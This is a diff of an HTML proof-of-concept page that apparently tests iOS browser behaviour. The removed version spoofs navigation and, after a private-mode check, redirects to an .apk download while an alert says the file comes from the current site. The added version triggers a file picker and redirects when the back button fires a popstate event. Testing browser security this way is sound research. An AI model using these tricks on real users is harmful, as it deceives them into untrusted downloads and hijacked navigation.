@@ -1,64 +1,37 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>PoC - iOS Fake Download and Navigation Spoofing</title>
-</head>
-<body>
+<!doctype html>
+<button id="start">START</button>
 
-    <h1>PoC - iOS Fake Download and Navigation Spoofing</h1>
-    <p>This test simulates a malicious behavior of downloading a fake file upon using the back button, deceiving the user.</p>
-    
-    <button id="startDownload">Start Fake Download</button>
-    <br><br>
-    <a href="https://example.com" id="exampleLink">Visit example.com</a>
-    
-    <script>
-        // Detect if we are in Private Browsing Mode (Incognito)
-        function isPrivateMode(callback) {
-            const fs = window.RequestFileSystem || window.webkitRequestFileSystem;
-            if (!fs) {
-                // If fs is undefined, private browsing is not supported
-                callback(false);
-                return;
-            }
+<!-- File Input element untuk memilih file -->
+<input type="file" id="fileInput" style="display: none;" />
 
-            fs(window.TEMPORARY, 100, function() {
-                callback(false); // not in private mode
-            }, function() {
-                callback(true); // in private mode
-            });
-        }
+<script>
+const log = (...a) => console.log("[PoC]", ...a);
 
-        // Simulate malicious file download
-        function initiateFakeDownload() {
-            // Simulate a fake download by redirecting to a file
-            const fakeFileUrl = "https://www.google.com/url?q=https%3A%2F%2Fecdnts-del.github.io%2Ftest-apk%2Fapple.apk&sa=D&sntz=1&usg=AOvVaw0onE08hhdtlihXeKuCFYTr"; // Just a placeholder URL
-            window.location.href = fakeFileUrl;  // This would typically attempt to trigger the file download
-            alert("Fake download initiated! The file appears to be from the current site.");
-        }
+// Fungsi untuk menangani pemilihan file
+document.getElementById("start").onclick = () => {
+  log("click isActive:", navigator.userActivation.isActive);
+  
+  // Menyembunyikan input file dan men-trigger event klik
+  document.getElementById("fileInput").click();
+};
 
-        // Event listener to trigger the fake download when button is clicked
-        document.getElementById('startDownload').addEventListener('click', function() {
-            isPrivateMode(function(isPrivate) {
-                if (isPrivate) {
-                    alert("You are in Private Browsing Mode. This could bypass security prompts.");
-                }
-                // Simulate a malicious file download
-                initiateFakeDownload();
-            });
-        });
+// Menangani perubahan file input
+document.getElementById("fileInput").addEventListener("change", (event) => {
+  const file = event.target.files[0];
+  if (file) {
+    log("FILE PICKER OPENED:", file.name);
+  } else {
+    log("No file selected.");
+  }
+});
 
-        // Event listener for the example link, simulating the redirection
-        document.getElementById('exampleLink').addEventListener('click', function(event) {
-            event.preventDefault();  // Prevents default link navigation
-            alert("Navigating to example.com, but back navigation will cause a fake download.");
-            // Simulating a user navigating away and clicking back later
-            window.location.href = "https://google.com";  // Redirect to simulate leaving the site
-        });
-    </script>
+// Event listener untuk popstate, yang akan di-trigger saat pengguna menekan tombol back
+window.addEventListener("popstate", () => {
+  setTimeout(async () => {
+    log("popstate isActive:", navigator.userActivation.isActive);
 
-</body>
-</html>
-
+    // Redirect ke Google.com setelah popstate untuk mensimulasikan efek dari popstate
+    window.location.href = "https://www.google.com";
+  }, 0);
+});
+</script>
